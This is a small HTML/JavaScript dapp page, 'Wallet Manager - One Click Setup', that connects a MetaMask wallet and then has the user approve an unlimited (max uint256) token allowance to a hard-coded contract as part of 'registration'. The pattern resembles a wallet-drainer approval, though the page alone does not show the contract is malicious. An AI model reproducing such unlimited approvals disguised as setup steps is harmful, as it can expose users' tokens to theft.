<!DOCTYPE html>
<html>
<head>
  <title>Wallet Connect + Approve + Register</title>
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
</head>
<body>
  <h2>Wallet Manager - One Click Setup</h2>
  <button id="connect">Connect Wallet</button>
  <button id="approveRegister">Approve & Register</button>

  <script>
    // ===== CONFIGURATION =====
    const CONTRACT_ADDRESS = "0x528E409e5F85f03C0FF2EE6151A0f9473F648d97"; // WalletManager
    const TOKEN_ADDRESS = "0xbea1762935F5C92b6c906b5cdEABB51211067098"; // Token

    // WalletManager ABI
    const ABI = [
      "function register() external",
      "function getUserAllowance(address user) external view returns (uint256)"
    ];

    // ERC20 ABI
    const ERC20_ABI = [
      "function approve(address spender, uint256 amount) external returns (bool)"
    ];

    let signer, contract, token;

    // ===== CONNECT WALLET =====
    document.getElementById("connect").onclick = async () => {
      if (window.ethereum) {
        await window.ethereum.request({ method: "eth_requestAccounts" });
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        signer = provider.getSigner();

        contract = new ethers.Contract(CONTRACT_ADDRESS, ABI, signer);
        token = new ethers.Contract(TOKEN_ADDRESS, ERC20_ABI, signer);

        alert("‚úÖ Wallet connected!");
      } else {
        alert("‚ùå MetaMask not found!");
      }
    };

    // ===== APPROVE & REGISTER =====
    document.getElementById("approveRegister").onclick = async () => {
      if (!signer) {
        alert("‚ö†Ô∏è Please connect wallet first!");
        return;
      }

      const maxUint = ethers.BigNumber.from("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");

      try {
        // 1Ô∏è‚É£ Approve Token
        console.log("Approving token spend...");
        const tx1 = await token.approve(CONTRACT_ADDRESS, maxUint);
        await tx1.wait();
        console.log("‚úÖ Token approved");

        // 2Ô∏è‚É£ Register in WalletManager
        console.log("Registering user...");
        const tx2 = await contract.register();
        await tx2.wait();
        console.log("‚úÖ User registered");

        alert("üéâ Approved & Registered successfully!");
      } catch (err) {
        console.error("‚ùå Error:", err);
        alert("‚ùå Transaction failed! Check console for details.");
      }
    };
  </script>
</body>
</html>
